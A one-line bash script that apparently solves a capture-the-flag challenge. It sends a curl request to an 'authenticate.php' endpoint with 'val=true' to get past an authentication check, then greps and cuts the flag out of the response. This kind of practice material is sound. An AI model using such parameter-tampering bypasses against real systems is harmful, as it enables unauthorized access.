#!/bin/bash

curl -s http://sec-army.ml/getme/authenticate.php?val=true -L | grep secarmy | cut -d ":" -f 2
